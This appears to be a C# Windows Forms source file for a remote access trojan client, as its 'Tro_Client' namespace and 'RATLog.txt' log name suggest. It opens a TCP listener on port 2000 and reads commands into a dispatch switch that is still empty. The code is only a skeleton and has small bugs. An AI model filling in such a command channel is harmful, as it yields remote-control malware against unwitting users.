using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tro_Client
{
	public partial class Form2 : Form
	{
		public static NetworkStream Reciver;
		public Form2()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();
			
			//
			// TODO: Add constructor code after the InitializeComponent() call.
			//
				TcpListener l = new TcpListener(2000);
                l.Start();
                Log("Started TcpListener..." , "ALWAYS");
                TcpClient Connection = l.AcceptTcpClient();
                Reciver = Connection.GetStream();
                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
                Log("Started Reciver!" , "ALWAYS");
                Rec.Start();
		}
		public static void Recive()
        {
            while (true)
            {
                try
                {
                    byte[] RecPacket = new byte[1000];
                    Reciver.Read(RecPacket, 0, RecPacket.Length);
                    Reciver.Flush();
                    string Command = Encoding.ASCII.GetString(RecPacket);
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "!!!!---");
                    Command = CommandArray[0];
                    switch(Command)
                    {
                    }
                }
                catch
                {
                    break;

                }
            }
        }
		
		public static string GetTempPath()
        {
        	string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        	if (!path.EndsWith("\\")) path += "\\";
        	return path;
        }
        
        public static void Log(string msg, string art)
        {
        	System.IO.StreamWriter sw = System.IO.File.AppendText(
        		GetTempPath() + "RATLog.txt");
        	try
        	{
        		string logLine = System.String.Format(
        			"{0:G}: {1}: {2} ", System.DateTime.Now,"|", art, msg);
        		sw.WriteLine(logLine);
        	}
        	finally 
        	{
        		sw.Close();
        	}
        }
	}
}
